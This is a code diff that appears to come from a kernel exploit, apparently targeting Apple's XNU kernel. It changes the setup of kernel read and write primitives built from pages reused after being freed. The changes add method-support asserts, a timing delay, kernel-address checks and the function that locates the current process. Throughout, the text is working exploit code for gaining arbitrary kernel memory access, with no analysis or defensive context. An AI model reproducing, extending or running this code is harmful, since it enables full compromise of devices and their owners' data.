@@ -72,6 +72,19 @@ void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);
 
 void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
 {
+    if (!kern_versions[kfd->info.env.vid].kread_kqueue_workloop_ctl_supported) {
+        assert(kread_method != kread_kqueue_workloop_ctl);
+    }
+    
+    if (!kern_versions[kfd->info.env.vid].krkw_iosurface_supported) {
+        assert(kread_method != kread_IOSurface);
+        assert(kwrite_method != kwrite_IOSurface);
+    }
+
+    if (kread_method == kread_sem_open) {
+        assert(kwrite_method == kwrite_sem_open);
+    }
+
     switch (kread_method) {
         kread_method_case(kread_kqueue_workloop_ctl)
         kread_method_case(kread_sem_open)
@@ -95,6 +108,7 @@ void krkw_run(struct kfd* kfd)
     timer_start();
     krkw_helper_run_allocate(kfd, &kfd->kread);
     krkw_helper_run_allocate(kfd, &kfd->kwrite);
+    usleep(1000);
     krkw_helper_run_deallocate(kfd, &kfd->kread);
     krkw_helper_run_deallocate(kfd, &kfd->kwrite);
     timer_end();
@@ -102,11 +116,13 @@ void krkw_run(struct kfd* kfd)
 
 void krkw_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
 {
+    assert(kaddr >= 0xffffff0000000000);
     kfd->kread.krkw_method_ops.kread(kfd, kaddr, uaddr, size);
 }
 
 void krkw_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
 {
+    assert(kaddr >= 0xffffff0000000000);
     kfd->kwrite.krkw_method_ops.kwrite(kfd, uaddr, kaddr, size);
 }
 
@@ -139,7 +155,7 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
         u64 grabbed_puaf_pages = 0;
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
-            if (!memcmp(copy_sentinel, (void*)(puaf_page_uaddr), copy_sentinel_size)) {
+            if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                     print_u64(grabbed_free_pages);
                     timer_end();
@@ -212,7 +228,7 @@ loop_break:
 
         assert_false(krkw_type);
     }
-    
+
     print_message(
         "%s ---> object_id = %llu, object_uaddr = 0x%016llx, object_size = %llu, allocated_id = %llu/%llu, batch_size = %llu",
         krkw_type,
@@ -226,7 +242,7 @@ loop_break:
 
     print_buffer(krkw->krkw_object_uaddr, krkw->krkw_object_size);
 
-    if (!kfd->info.kernel.current_proc) {
+    if (!kfd->info.kaddr.current_proc) {
         krkw->krkw_method_ops.find_proc(kfd);
     }
 }
